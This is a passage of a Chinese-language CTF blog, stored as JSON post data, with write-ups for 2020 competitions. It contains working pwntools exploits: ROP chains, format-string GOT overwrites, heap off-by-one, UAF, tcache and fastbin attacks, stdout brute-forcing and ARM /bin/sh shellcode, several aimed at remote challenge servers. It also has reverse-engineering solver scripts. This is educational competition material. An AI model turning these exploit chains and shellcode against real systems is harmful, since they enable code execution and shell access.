0x00, 0x3F, 0x00, 0x00, 0x00, 0x2C, 0x00, 0x00, 0x00, \n  0x17, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x1F, 0x00, \n  0x00, 0x00, 0x69, 0x00, 0x00, 0x00, 0x0B, 0x00, 0x00, 0x00, \n  0x06, 0x00, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x69, 0x00, \n  0x00, 0x00, 0x35, 0x00, 0x00, 0x00, 0x30, 0x00, 0x00, 0x00, \n  0x3D, 0x00, 0x00, 0x00, 0x38, 0x00, 0x00, 0x00, 0x20, 0x00, \n  0x00, 0x00, 0x78, 0x00, 0x00, 0x00, 0x78, 0x00, 0x00, 0x00, \n  0x78, 0x00, 0x00, 0x00, 0x24, 0x00, 0x00, 0x00]\nfor i in range(0,len(s),4):\n    print(chr(s[i]^89),end = \"\")\n#CUMTCTF{Have_fuN_F0R_H0liday!!!}\n```\n\n## 3.re5--game\n\n挺有意思的题目\n\n长时间不做逆向，连花指令都忘了，就长这样，看到jnz一个地址+2，应该很容易想到的我丢\n\n![image-20210130162118817](https://i.loli.net/2021/01/30/kmsGt1xu4yEQi2T.png)\n\n于是去了花之后，IDA恢复正常\n\n逆向题全是去了符号表的比较难受，逻辑不是很复杂，大体是这样的：\n\n你的输入两两一组，相当于一个坐标，程序会根据你的坐标去一个10*10的map里找，取出相应的字母拼接，每5个字母为1组，然后加上'@'进行分割，将这些字符放入一个指定内存，在主函数中会重新将这些字符放入栈中进行操作，最后的check函数算有两个，第一个check会比较每5个一组的字符串与第几个偏移的内存数据相同，会记下下标，并在另一个字典中按这个下标取出字母，直到所有比较结束，将根据你输入得到的字符串与字符串`johnnysilverhand`进行比较，若相同则输出flag\n\n这题有多种解法，我的方法是横坐标恒取0，即可绕过判断\n\n脚本如下:\n\n```python\nqu='abcdefghijklmnopqrstuvwxyz!.?*'\nchk='johnnysilverhand'\ndic['CFUMT','CFUTM','CTFMU','CTFUM','CTMFU','FCMTU','FCMUT','FCUTM','FMCTU','FTMUC','FTUCM','FTUMC','FUCMT','FUTCM','FUTMC','MCFTU','MUCFT','MUCTF','MUTCF','TUCFM','TUCMF','TUFMC','TUMCF','TUMFC','UCFMT','UCMFT','UCMTF','UCTFM','UTMCF','UTMFC']\n#print(len(qu))\ndic2=[0x41,0x5A,0x54,0x55,0x59,0x50,0x46,0x51,0x41,0x5A,\n0x55,0x49,0x56,0x5A,0x56,0x43,0x52,0x41,0x41,0x49,\n0x44,0x41,0x5A,0x4D,0x56,0x49,0x41,0x43,0x5A,0x44,\n0x48,0x5A,0x48,0x5A,0x48,0x56,0x49,0x48,0x41,0x49,\n0x48,0x44,0x4D,0x46,0x55,0x54,0x55,0x54,0x44,0x49,\n0x4D,0x55,0x43,0x4D,0x5A,0x46,0x54,0x48,0x44,0x48,\n0x56,0x44,0x56,0x42,0x44,0x48,0x56,0x4D,0x41,0x43,\n0x5A,0x46,0x55,0x54,0x42,0x44,0x43,0x52,0x42,0x44,\n0x46,0x41,0x42,0x42,0x43,0x44,0x52,0x49,0x52,0x49,\n0x43,0x42,0x54,0x44,0x46,0x49,0x56,0x44,0x42,0x52]\nidx = []\nfor ch in chk:\n    for i in range(30):\n        if(qu[i]==ch):\n            idx.append(i)\n            \n# print(len(dic2))\nfor i in range(len(idx)):\n    print (\"\")\n    print (dic[idx[i]],end = \" \")\n    for j in range(5):\n        for k in range(len(dic2)):\n            if (dic[idx[i]][j]==chr(dic2[k])):\n                print (\"0\"+chr(k+0x30),end = ' ')\n                break\n```\n\n![image-20210130163403626](https://i.loli.net/2021/01/30/Ls1eNtrViFbQdYO.png)\n\n对了记录一个奇怪的坑点\n\n一开始我并不知道这题要nc，所以我就在本地测试，当我输入答案之后字符串没问题\n\n这是在栈中的自己生成的字符串:\n\n![image-20210130163935188](https://i.loli.net/2021/01/30/lE5SVuOhgMpf3oT.png)\n\n这是在内存中的check字符串:\n\n![image-20210130164118228](https://i.loli.net/2021/01/30/LxD2OnCKPYVB1tp.png)\n\n但是最后调用strcmp时，rdi却只取了前8个字节的字符串\n\n![image-20210130164233618](https://i.loli.net/2021/01/30/nAXbH7a3mYtQdOf.png)\n\n所以最后比较就没有通过，挺离谱的，存疑\n\n# 0x05 小结\n\n太菜了...抽空复现一下其他题","tags":["CTF","wp"],"categories":["PWN"]},{"title":"Dec_Match 2020","url":"/2021/01/01/Dec_Match/","content":"\n# 前言\n\n2020最后一个月，划水的一个月，没什么比赛，也没什么事情，17级考研结束了，我们也该准备了\n\n没啥好写的，老规矩，放上校赛题解\n\n~~(最后一波狙击似乎把比赛整乱套了，社工大军开始疯狂py......இ௰இ)~~\n\n![](https://files.catbox.moe/yo7jqt.png)\n\n## 0x00 pwn1\n\nstrlen() \\x00截断，绕过strcmp，覆盖掉变量为123\n\n```python\nfrom pwn import *\nelf = ELF(\"./pwn1\")\n# p = elf.process()\np = remote('219.219.61.234','10000')\np.send('\\x00'+'a'*6+p32(123)+p32(0))\np.interactive()\n```\n\n## 0x01 pwn2\n\n和pwn1同理，利用两次ROP构造来getshell \n\n```python\nfrom pwn import *\nelf = ELF(\"./pwn2\")\n# p = elf.process()\n# context.log_level = 'debug'\n# libc = ELF('libc.so.6')\nlibc = ELF('libc6-i386_2.23-0ubuntu11.2_amd64.so')\np = remote('219.219.61.234','10001')\np.send('\\x00'+'a'*6+p32(12345)+p32(0))\npayload = 'a'*0x6c + 'b'*4 + p32(elf.plt['puts']) +p32(0x8048753) + p32(elf.got['puts'])\np.recvuntil(\"haha\\n\")\np.send(payload)\nlibc_base = u32(p.recvuntil(\"\\xf7\").ljust(4,'\\x00')) - libc.sym['puts']\ninfo(hex(libc_base))\nsys = libc_base  + libc.sym['system']\nbinsh = libc_base + 0x15910b\npayload = 'a'*0x6c + 'b'*4 + p32(sys)+'a'*4+ p32(binsh)\np.send(payload)\np.interactive()\n```\n\n## 0x02 pwn3\n\n通过构造，将结构体内的puts函数指针改为system\n\n```python\nfrom pwn import *\nelf=ELF('./pwn3')\n# p = elf.process()\np =remote('219.219.61.234',10002)\nlibc = ELF('libc.so.6')\ndef add(size,con):\n    p.sendlineafter('Your choice :','1')\n    p.sendlineafter('Note size :',str(size))\n    p.sendafter('Content :',con)\n\ndef delete(idx):\n    p.sendlineafter('Your choice :','2')\n    p.sendlineafter('Index:',str(idx))\n\ndef show(idx):\n    p.sendlineafter('Your choice :','3')\n    p.sendlineafter('Index :',str(idx))\nbackdoor=0x08048986\ninfo(hex(backdoor))\nadd(16,'ld1ng')\nadd(16,'ld1ng')\ndelete(0)\ndelete(1)\nadd(8,p32(backdoor))\nshow(0)\n\np.interactive() \n```\n\n## 0x03 pwn4\n\n在子洋师傅的帮助下用matlab解出密钥，然后格式化字符串漏洞泄露libc基址，地址任意写，可以修改puts的got表\n\n```python\nfrom pwn import *\nelf=ELF('./pwn4')\n# context.log_level = 'debug'\ncontext(arch='amd64',os='linux')\n# p = elf.process()\np =remote('219.219.61.234',10003)\nlibc = ELF('libc-2.23.so')\npasswd = '3xpL0r3R'\nonegadget = [0x45226,0x4527a,0xf0364,0xf1207]\nputs_got = elf.got['printf']\np.sendlineafter(\"important secret\",'ld1ng')\np.sendlineafter(\">>\",str(3))\np.sendlineafter(\"please inputs password >>\",passwd)\np.recv()\np.recvuntil(\"secret\\n\")\np.recvuntil(\"secret\\n\")\n# gdb.attach(p)\n# p.sendlineafter(\"please your secret\",\"%45$p\")\np.sendline(\"%77$p\")\nlibc_base = int(p.recv(15),16) - 0x20840\ninfo(hex(libc_base))\none_gadget = libc_base + onegadget[0]\npayload = fmtstr_payload(6,{puts_got:one_gadget})\np.sendline(payload)\np.interactive()\n```\n\n## 0x04 pwn5\n\nfree unsortedbin泄露libc基址，通过单字节溢出，来构造overlap，通过就该下个堆块的struct变量地址来修改got表，从而getshell，(打远程时出了点问题，可以通过show free的got表来泄露libc版本)\n\n```python\nfrom pwn import *\nelf = ELF('./pwn5')\n# p = elf.process()\np = remote('219.219.61.234','10004')\nlibc = ELF('libc-2.23.so')\n# libc = ELF('libc.so.6')\n# context.log_level = 'debug'\nog = [0x4f3d5,0x4f432,0x10a41c,0x45226,0x4527a,0xf0364,0xf1207]\ndef add(size,con):\n\tp.sendlineafter('Your choice :','1')\n\tp.sendlineafter('Size:',str(size))\n\tp.sendafter('Content:',con)\n\ndef edit(idx,con):\n    p.sendlineafter('Your choice :','2')\n    p.sendlineafter('Index:',str(idx))\n    p.sendafter('Content:',con)\n\ndef delete(idx):\n\tp.sendlineafter('Your choice :','4')\n\tp.sendlineafter('Index:',str(idx))\n\ndef show(idx):\n\tp.sendlineafter('Your choice :','3')\n\tp.sendlineafter('Index:',str(idx))\n# buf = 0x2177158\nadd(0x90,\"aaa\") #0\nadd(0x48,\"bbb\") #1\ndelete(0)\nadd(0x90,'\\x78')\nshow(0)\np.recvuntil(\"Content: \")\nlibc_base = u64(p.recvuntil('\\x7f').ljust(8,'\\x00')) -88 -0x10 -libc.sym['__malloc_hook'] #- 0x3c4b78\ninfo(hex(libc_base))\n# add(0x68,\"ccc\")\n# add(0x68,\"ddd\")\n# edit(1,'a'*0x48+'\\x91')\n# delete(2)\nadd(0x18,'aaaa')#2\nadd(0x10,'bbbb')#3\nadd(0x10,'cccc')#4\nadd(0x10,'/bin/sh')#5\nedit(2,'a'*0x18+'\\x81')\ndelete(3)\n\npayload = 'd'*0x40+ p64(8) + p64(elf.got['free'])\nadd(0x70,payload)#3\nshow(4)\np.recvuntil(\"Content: \")\nfree_addr = u64(p.recvuntil('\\x7f').ljust(8,'\\x00'))\ninfo(hex(free_addr))\n# libc_base = free_addr - libc.sym['free']\nsystem_addr = libc_base + libc.sym['system']\none = libc_base + og[6]\ninfo(hex(system_addr))\nedit(4,p64(system_addr))\n# edit(4,p64(one))\ndelete(5)\n\np.interactive()\n```\n\n## 0x05 pwn6\n\nuaf和单字节溢出漏洞，与pwn5类似的构造，通过got表的修改来getshell\n\n```python\nfrom pwn import *\nelf = ELF('./pwn6')\n# p = elf.process()\np = remote('219.219.61.234','10005')\n# libc = ELF('libc-2.23.so')\nlibc = ELF('libc.so.6')\n# context.log_level = 'debug'\ndef enter():\n    p.sendlineafter(\"important secret\",\"ld1ng\")\n    p.sendlineafter(\">>\",\"2\")\n\ndef add(idx,size,con):\n    p.sendlineafter('Your Choice>>','1')\n    p.sendlineafter('index>>',str(idx))\n    p.sendlineafter('size>>',str(size))\n    p.sendlineafter('name>>',con)\n\ndef edit(idx,con):\n    p.sendlineafter('Your Choice>>','3')\n    p.sendlineafter('index>>',str(idx))\n    p.sendafter('name>>',con)\n\ndef delete(idx):\n    p.sendlineafter('Your Choice>>','2')\n    p.sendlineafter('index>>',str(idx))\n\ndef show(idx):\n    p.sendlineafter('Your Choice>>','5')\n    p.sendlineafter('index>>',str(idx))\nenter()\nadd(0,128,\"aaa\")\nadd(1,128,\"bbb\")\ndelete(0)\nshow(0)\nlibc_base = u64(p.recvuntil('\\x7f')[-6:].ljust(8,'\\x00')) - 88 - 0x10 -libc.sym['__malloc_hook']\ninfo(hex(libc_base))\nsys = libc_base + libc.sym[\"system\"]\ninfo(hex(sys))\nadd(2,0x88,\"ccc\")\nadd(3,0x88,\"ddd\")\nadd(4,0x88,\"eee\")\nedit(0,'a'*0x88 + '\\xd1')\ndelete(1)\nadd(5,0xc8,\"fff\")\nedit(5,p64(0)*3+p64(0x21)+p64(0)*16+p64(0)+p64(0x21)+p64(0x88)+p64(0x602080)+p64(0))\np.sendline(\"ls\")\n# add(6,0x80,\"ld1ng\")\nedit(3,p64(sys))\np.sendline(\"ls\")\np.sendline(\"cat flag\")\n# delete(4)\n\np.interactive()\n```\n\n## 0x06 pwn7\n\nubuntu18.4，利用tcache机制，构造一个合并的大unsorted堆块，利用单字节溢出(off by none)，修改下一个chunk的size位，利用unlink机制会造成中间块重叠，也就是说还会再申请到中间块，造成两个指针指向同一内存区域，这样修改fd指针将free_hook改为onegadget即可\n\n```python\nfrom pwn import *\nelf = ELF('./pwn7')\n# p = elf.process()\np = remote('219.219.61.234','10050')\n# libc = ELF('libc-2.27.so')\nlibc = ELF('libc.so')\n# context.log_level = 'debug'\nog = [0x4f3d5,0x4f432,0x10a41c,0x4f365,0x4f3c2,0x10a45c]\ndef add(size,con):\n\tp.sendlineafter('> ','1')\n\tp.sendlineafter('> ',str(size))\n\tp.sendlineafter('> ',con)\ndef delete(idx):\n\tp.sendlineafter('> ','2')\n\tp.sendlineafter('> ',str(idx))\ndef show(idx):\n\tp.sendlineafter('> ','3')\n\tp.sendlineafter('> ',str(idx))\nfor i in range(10):\n\tadd(0x10,'a')\nfor i in range(3,10):\n\tdelete(i)\nfor i in range(3):\n\tdelete(i)\nfor i in range(10):\n\tadd(0x10,'a') #unsortdebin -> 7,8,9\nfor i in range(6):\n\tdelete(i)\ndelete(8) \ndelete(7) \nadd(0xf8,'ld1ng') #idx9 -> 0\ndelete(6)\ndelete(9)\nfor i in range(8):\n\tadd(0x10,'b')\nshow(0)\nlibc_base = u64(p.recv(6).ljust(8,'\\x00')) - 96 - 0x3ebc40\ninfo('libc_base : '+hex(libc_base))\nfree_hook = libc_base + libc.sym['__free_hook']\none_gadget = libc_base +og[1] #0x4f3c2 0x4f365  0x10a45c\n# sys = libc_base + libc.sym[\"system\"]\ninfo('free_hook : '+hex(free_hook))\ninfo('one_gadget : '+hex(one_gadget))\nadd(0x10,'d')\ndelete(1)\ndelete(0)\ndelete(9)\nadd(0x20,p64(free_hook))\nadd(0x20,'e')\nadd(0x20,p64(one_gadget))\ndelete(3)\np.sendline(\"cat flag\")\np.interactive()\n```\n\n# 0x08 华为XCTF ARM pwn1\n\n第一次做arm pwn，先搭建好arm环境，但是没有搞定符号表，动调也很麻烦，存疑\n\n题目是一道很简单的栈溢出，但是需要学习掌握arm的汇编知识\n\n看一下源程序\n\n```assembly\nmain                                    ; DATA XREF: _start+20↑o\n.text:000104A0                                         ; .text:off_103DC↑o\n.text:000104A0\n.text:000104A0 buf             = -0x104\n.text:000104A0\n.text:000104A0                 PUSH            {R11,LR}\n.text:000104A4                 ADD             R11, SP, #4\n.text:000104A8                 SUB             SP, SP, #0x100\n.text:000104AC                 LDR             R2, =_GLOBAL_OFFSET_TABLE_ ; PIC mode\n.text:000104B0                 NOP\n.text:000104B4                 LDR             R3, =(stdout_ptr - 0x21000)\n.text:000104B8                 LDR             R3, [R2,R3] ; stdout\n.text:000104BC                 LDR             R0, [R3] ; stream\n.text:000104C0                 MOV             R3, #0  ; n\n.text:000104C4                 MOV             R2, #2  ; modes\n.text:000104C8                 MOV             R1, #0  ; buf\n.text:000104CC                 BL              setvbuf\n.text:000104D0                 LDR             R3, =(aInput - 0x104DC) ; \"input: \"\n.text:000104D4                 ADD             R3, PC, R3 ; \"input: \"\n.text:000104D8                 MOV             R0, R3  ; format\n.text:000104DC                 BL              printf\n.text:000104E0                 SUB             R3, R11, #-buf\n.text:000104E4                 MOV             R2, #0x300 ; nbytes\n.text:000104E8                 MOV             R1, R3  ; buf\n.text:000104EC                 MOV             R0, #0  ; fd\n.text:000104F0                 BL              read\n.text:000104F4                 MOV             R3, #0\n.text:000104F8                 MOV             R0, R3\n.text:000104FC                 SUB             SP, R11, #4\n.text:00010500                 POP             {R11,PC}\n```\n\n程序开了NX保护，所以尝试用rop来攻击\n\n首先寻找一些比较有用的gadget\n\n```\n0x00056b7c : pop {r0, r4, pc}\n0x00010500 : pop {fp, pc}\n0x00010348 : pop {r3, pc}\n0x00010498 : pop {r4, pc}\n```\n\n思路是，第一次泄露libc基址，通过printf将read_got泄露\n\n但是没有单独的pop r0的gadget，所以尝试pop {r3, pc}，然后返回到0x000104D8\n\n![image-20201231152256196](https://i.loli.net/2020/12/31/vN2eJ7aZS9cXqon.png)\n\n这样就可以打印出libc基址，然后就卡住了，似乎没办法控制pc了\n\n但是神奇的是，通过动调发现libc基址并没有发生变化，然后尝试记下固定的libc基址，构造payload\n\npayload='a'\\*0x104+p32(pop_0_4)+p32(bin_sh)\\*2+p32(system)即可\n\n至于为什么libc基址不变，查了很多资料并没有收获，\n\n但听A1GX师傅说，运行的qemu的虚拟框架内可能是没有nx保护或者alsr，存疑\n\n### exp\n\n```python\nfrom pwn import *\ncontext(arch='arm',os='linux',log_level='debug')\nelf=ELF('./bin')\n# libc=ELF('./libc-2.31.so')\nlibc = ELF('/usr/arm-linux-gnueabihf/lib/libc.so.6')\ndef gdb_attach():\n    os.system('gnome-terminal -x sh -c \"gdb-multiarch ./bin -ex \\'target remote 127.0.0.1:1234\\'\"')\n# io = process([\"qemu-arm\",\"-g\",\"1234\",\"-L\",\"/usr/arm-linux-gnueabihf\",\"./bin\"])\nio = process([\"qemu-arm\",\"-L\",\"/usr/arm-linux-gnueabihf\",\"./bin\"])\n# io = remote(\"139.159.210.220\",9999)\nread_got=elf.got['read']\nprintf_got=elf.got['printf']\nprintf_plt = elf.plt['printf']\n# print hex(libc.sym['read'])\nprint hex(read_got)\n# payload = '\\x00'*0x104+p32(0x00010348)+p32(read_got)+p32(0x000104D8)\n\n# io.sendafter(\"input: \",payload)\n# libc_base = u32(io.recv(4)) - libc.sym['read']\n# info(hex(libc_base))\nlibc_base = 0xf66cc000\nsystem=libc_base+libc.sym['system']\nbin_sh=libc_base+0xca574\npop_0_4=libc_base+0x00056b7c\n# gdb.attach(proc.pidof(io)[0])\npayload='a'*0x104+p32(pop_0_4)+p32(bin_sh)*2+p32(system)\nio.send(payload)\n# io.sendline(\"ls\")\nio.interactive()\n```\n\n虽然显示开启了NX保护，但是我发现各个段都是有可执行权限的(太疑惑了!)，所以可以向bss段写入shellcode\n\n```python\nfrom pwn import *\ncontext(arch='arm',os='linux',log_level='debug')\n\n# io = process([\"qemu-arm\",\"-g\",\"1234\",\"-L\",\".\",\"./bin\"])\nio = process([\"qemu-arm\",\"-L\",\"/usr/arm-linux-gnueabihf\",\"./bin\"])\n# io = remote(\"139.159.210.220\",9999)\nshellcode =  b'\\x02\\x20\\x42\\xe0\\x1c\\x30\\x8f\\xe2'\nshellcode += b'\\x04\\x30\\x8d\\xe5\\x08\\x20\\x8d\\xe5'\nshellcode += b'\\x13\\x02\\xa0\\xe1\\x07\\x20\\xc3\\xe5'\nshellcode += b'\\x04\\x30\\x8f\\xe2\\x04\\x10\\x8d\\xe2'\nshellcode += b'\\x01\\x20\\xc3\\xe5\\x0b\\x0b\\x90\\xef'\nshellcode += b'/bin/sh;'\n\npop_r3_pc = 0x00010348\ndata_addr = 0x00021030\nread_addr = 0x000104E8\n\npayload = b'a'*256+p32(data_addr)+p32(pop_r3_pc)+p32(data_addr)+p32(read_addr)\nio.sendafter(\"input: \",payload)\nio.sendline(p32(data_addr+4)+shellcode)\nio.interactive()\n```\n\n# 0x09 年度小结~\n\n大家新年快乐！","tags":["CTF"],"categories":["PWN"]},{"title":"Nov_Match 2020","url":"/2020/11/30/Nov_Match/","content":"\n# 0x00 前言\n\n11- 4 去了南京参加全国工业互联网安全大赛 ~~(Final)~~，学生组第十名，2等奖还是挺满意的\n\n11-4晚 为了买糕点错过了高铁...\n\n11-10 考算法，两天复习算法，半天复习代码，都过了\n\n11-14的上海赛出了点(意外)，不过还不错帮hxdm冲到第七名\n\n# 0x01 湖湘杯2020 pwn_printf\n\n> \n>\n> emmm湖湘杯py大赛，最后一小时的狂欢，不想说什么了，真的冲不动...\n>\n> \n\n原GoogleCTF的逆向题，sprintf构造的虚拟机，改成了pwn题，存在非预期\n\n当第九个参数为0x20，存在栈溢出，rop\n\n![image-20201104205621829](https://i.loli.net/2020/11/04/gEoi728fbGqB9ny.png)\n\nrbp覆盖为0x603500，通过改变rsi，来进行栈迁移\n\n## exp\n\n```python\nfrom pwn import *\nelf = ELF(\"./pwn_printf\")\np = elf.process()\nlibc = ELF(\"./pwn_printf\").libc\n#p = remote(\"47.111.104.99\",51006)\np.recvuntil(\"You will find this game very interesting\\n\")\nfor i in range(16):\n\tp.sendline(str(0x20))\nputs_plt = elf.plt['puts']\nputs_got = elf.got['puts']\npop_rdi = 0x0000000000401213\np.send(p64(0x603500)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(0x4007DF))\nlibc_base = u64(p.recv(6)+'\\x00\\x00') - libc.sym['puts']\ninfo(\"libc_base:\" + hex(libc_base))\np.sendline(\"a\"*0x8+p64(pop_rdi)+p64(libc_base+libc.search(\"/bin/sh\").next())+p64(libc_base+libc.sym['system']))\np.interactive()\n```\n\n\n\n# 0x02 湖湘杯2020 blend_pwn\n\n我愿称之为“一个字节的胜利”，以后一定要慎用sendline函数！\n\n题目很多漏洞，要综合使用，其中主要考点是C++异常处理，参考文章[pwn DCTF2017 Flex](https://firmianay.github.io/pwn_dctf2017_flex/)\n\n利用格式化字符串泄露libc基地址，del函数中没有对chunk中的内容进行清零，然后利用show功能泄露出堆地址，再利用 partial write 实现栈迁移到我们已经布置好onegadget的堆上后实现getshell。\n\n## exp\n\n```python\n#coding=utf-8\nfrom pwn import *\n#context.log_level='debug'\nsh=process(\"./blend_pwn\")\nlibc=ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")\n#sh=remote('47.111.104.169',57704)\nog = [0x45226 ,0x4527a,0xf0364,0xf1207]\ndef name(name):\n    sh.recvuntil(\"name:\")\n    sh.send(name)\n\ndef showname():\n    sh.recvuntil('choice >')\n    sh.sendline(str(1))\n\ndef add(content):\n\tsh.recvuntil('choice >')\n\tsh.sendline(str(2))\n\tsh.sendline(content)\n\ndef show():\n\tsh.recvuntil(\"choice >\")\n\tsh.sendline(str(4))\n\ndef delete(idx):\n\tsh.recvuntil(\"choice >\")\n\tsh.sendline(str(3))\n\tsh.recvuntil(\"index>\")\n\tsh.sendline(str(idx))\n\ndef gift(con):\n    sh.recvuntil(\"choice >\")\n    sh.sendline(str(666))\n    sh.recvuntil(\"Please input what you want:\")\n    #gdb.attach(sh,\"b *$rebase(0x11E9)\")\n    sh.send(con)\n\nname(\"%11$p\")\nshowname()\nsh.recvuntil(\"Current user:\")\nlibc_base = int(sh.recvline(),16) - libc.sym['__libc_start_main'] -240\n# read1 = libc_base + libc.sym['read']\ninfo(hex(libc_base))\nonegadget = libc_base + og[1]\ninfo(hex(onegadget))\n# sys = libc_base + libc.sym['system']\nadd(p64(onegadget)*0xc)\nadd(p64(onegadget)*0xc)\ndelete(0)\ndelete(1)\nshow()\nsh.recvuntil('index 2:')\nheap_addr = u64(sh.recvuntil('\\n',drop = True).ljust(8,'\\x00')) + 0x28\ninfo(hex(heap_addr))\npayload = 'a'*0x20 + p64(heap_addr)\ngift(payload)\n\nsh.interactive()\n```\n\n\n\n# 0x03 湖湘杯2020 babyheap\n\n辛苦**pwnht**学长了。。。似乎关键漏洞不是单字节写0，是我菜了，，，\n\n不过学到了加载libc的新方法，`env ={\"LD_PRELOAD\":\"./libc.so.6\"}`，\n\n漏洞点在于show 和 delete的idx没有检查边界，，首先用`show(-7)`leak出pie地址。\n\n接着填满tcache，leak出libc地址和堆地址。\n\n然后在堆上伪造出size为0x100的堆块，并用del函数进行free，然后劫持其fd指针修改为`__free_hook`，并改为system函数地址，执行/bin/sh即可。\n\n## exp\n\n```python\nfrom pwn import *\np = process(\"./babyheap\",env ={\"LD_PRELOAD\":\"./libc.so.6\"}) #load target libc\nlibc = ELF(\"./libc.so.6\")\ndef add():\n\tp.recvuntil(\">>\")\n\tp.sendline(\"1\")\ndef show(idx):\n\tp.recvuntil(\">>\")\n\tp.sendline(\"2\")\n\tp.recvuntil(\"index?\")\n\tp.sendline(str(idx))\ndef edit(idx,size,data):\n\tp.recvuntil(\">>\")\n\tp.sendline(\"3\")\n\tp.recvuntil(\"index?\")\n\tp.sendline(str(idx))\n\tp.recvuntil(\"Size:\")\n\tp.sendline(str(size))\n\tp.recvuntil(\"Content:\")\n\tp.send(data)\ndef free(idx):\n\tp.recvuntil(\">>\")\n\tp.sendline(\"4\")\n\tp.recvuntil(\"index?\")\n\tp.sendline(str(idx))\nshow(-7)\np.recvline()\npie = u64(p.recv(6)+'\\x00\\x00')-0x202008 #leak_pie\nprint hex(pie)\nfor i in range(8):\n\tadd()\nfor i in range(8):\n\tfree(7-i)\nfor i in range(8):\n\tadd()\nedit(7,0x20,'a'*8)\nshow(7)\np.recvuntil(\"a\"*8)\nlibc.address = u64(p.recv(6)+'\\x00\\x00')-0x3EBCA0 #leak_libc\nprint hex(libc.address)\nshow(0)\np.recvline()\nheap = u64(p.recv(6)+'\\x00\\x00')\nprint hex(heap)\nedit(0,0x88,p64(heap-0xD0)*5+p64(0x101))\nedit(1,0x88,p64(0)*5+p64(0x101))\nfree(( heap - 0xe0 - (pie+0x202040) )/8) #offset\nedit(0,0x88,p64(heap-0xD0)*5+p64(0x101)+p64(libc.sym['__free_hook']))\n#gdb.attach(p,'b *$rebase(0x202040)')\nadd()\nadd()\nedit(9,9,p64(libc.sym['system']))\nedit(2,8,'/bin/sh\\x00')\nfree(2)\np.interactive()\n```\n\n\n\n# 0x04 上海赛 lgtwo\n\n> 比赛4道pwn题和A1GX师傅冲了3道，有一道之前写过类似的就不写题解了\n>\n\n这题一开始思路就错了，耽误了很长时间，\n\n**难点：** 利用off by one 将1改成三个chunk大小，free 2 进入fastbin，free 1 放入unsortedbin，然后分割unsortedbin，将main_arena放入fastbin\n\n**思路：** 利用off by one构造overlap，没有show函数，所以通过爆破stdout泄露libc基址，然后通过unlink修改free_hook为onegadget从而getshell\n\n## exp\n\n```python\nfrom pwn import *\n# context.log_level = 'debug'\ncontext.binary = './lgtwo'\n# p = process('./pwn')\nelf = ELF('./lgtwo')\nlibc = elf.libc\ndef add(size,payload):\n\tp.sendlineafter('>> ','1')\n\tp.sendlineafter('?',str(size))\n\tp.sendafter('?',payload)\ndef delete(idx):\n\tp.sendlineafter('>> ','2')\n\tp.sendlineafter('?',str(idx))\n\ndef show(idx):\n\tp.sendlineafter('>> ','3')\n\tp.sendlineafter('?',str(idx))\n\ndef change(idx,payload):\n\tp.sendlineafter('>> ','4')\n\tp.sendlineafter('?',str(idx))\n\tp.sendafter('?',payload)\nbuf = 0x6020C0\nstdout = 0x602020\n\nwhile(1):\n\t#p = remote('123.56.52.128','45830')\n\tp = process('./lgtwo')\n\tadd(0x18,'aaa') #0\n\tadd(0x18,'bbb') #1\n\tadd(0x60,'ccc') #2\n\tadd(0x30,'aaa') #3\n\tadd(0x10,'ddd') #4\n\tchange(0,'a'*0x10+p64(0)+p8(0xd1))\n\tdelete(2) \n\tdelete(1)\n\tadd(0x18,'aaa') #1\n\tadd(0xa0,'ccc') #2\n\tchange(1,'a'*0x10+p64(0)+'\\x70')\n\tchange(2,'\\xdd'+'\\x15')  \n    \n\tadd(0x60,'aaa') #5\n\ttry:\n\t\tadd(0x68,'bbb') #6\n\texcept EOFError:\n\t\tprint 'error!!!'\n\t\tp.close()\n\t\tcontinue\n\tchange(6,'\\x00'*0x33 +p64(0xfbad18a0)+p64(0)*3+p8(0) )\n\tlibc_base = u64(p.recvuntil('\\x7f')[-6:].ljust(8,'\\x00'))-0x3c5600\n\tone = [0x45226,0x4527a,0xf0364,0xf1207]\n\tone_gadget = libc_base+one[1]\n\tfree_hook = libc_base+libc.sym['__free_hook']\n\tinfo(hex(libc_base))\n\t# gdb.attach(p)\n\t# pause()\n\tadd(0x48, \"ddaa\") #7\n\tadd(0x80,'ddaa') #8\n\tadd(0x10,'aaaa' ) #9\n\tpayload = p64(0)+p64(0x41)\n\tpayload += p64(buf +7*8- 0x18)  #fd\n\tpayload += p64(buf +7*8- 0x10)  #bk\n\tpayload += 'a'*0x20\n\tpayload += p64(0x40)+p8(0x90) \n\tchange(7,payload)\n\tdelete(8)\n\tchange(7,p64(0)*3+p64(free_hook))\n\tchange(7,p64(one_gadget))\n\tdelete(9)\n\tp.interactive()\n```\n\n\n\n# 0x05 上海赛 maj0rone\n\n给了大量混淆像这样，真吓人，距离比赛结束还有两个小时本不想做了的\n\n![image-20201116001757421](https://i.loli.net/2020/11/16/WJOMZH34pFB1Knh.png)\n\n但是A1GX师傅说不要看这些混淆并爆破出这个\n\n```python\nfor a1 in range(512):\n    v1 = 512\n    if ( a1 <= 512 ):\n        v1 = a1\n    if ( v1 <= 300 ):\n        v2 = a1\n    else:\n        v2 = 300\n    if ( v2 >= 150 ):\n        v3 = 150\n    else:\n        v3 = a1\n    if ( v3 <= 80 ):\n        v4 = 80\n    else:\n        v4 = a1\n    v7 = v4\n    if ( v4 <= 80 ):\n        v4 = 80\n    if ( v4 >= 83 ):\n        v5 = 80\n    else:\n        v5 = v7\n    if(a1==v5):\n        print(a1)\n# 80 81 82\n```\n\n这样就可以进入函数了，其实就是一道常规堆题，给了我很大信心/滑稽\n\n**难点：**将0放入unsortedbin，然后分割成2，3，将3放入fastbin，改3的size为0x91，为了避免doublefree，所以先free一次4，然后再free 3 ，这样之后，3既在fastbin又在unsortedbin，再将3size改回0x71，这样做的目的就是为了让main_arena放入fastbin中，所以只有一条fastbin链后，就可以爆破stdout了\n\n**思路：**利用uaf漏洞，分割unsortedbin，通过构造获得fastbin，由于没有输出函数，所以爆破stdout泄露libc基址，最后利用fastbin attack将fd改为malloc_hook-0x23，从而将malloc_hook改为onegadget getshell\n\n## exp\n\n```python\nfrom pwn import *\n# context.log_level = 'debug'\ncontext.binary = './maj0rone'\n# p = process('./pwn')\nelf = ELF('./maj0rone')\nlibc = elf.libc\ndef add(size,payload):\n\tp.sendlineafter('>> ','1')\n\tp.sendlineafter('n',str(80))\n\tp.sendlineafter('?',str(size))\n\tp.sendafter('?',payload)\n\ndef delete(idx):\n\tp.sendlineafter('>> ','2')\n\tp.sendlineafter('?',str(idx))\n\ndef 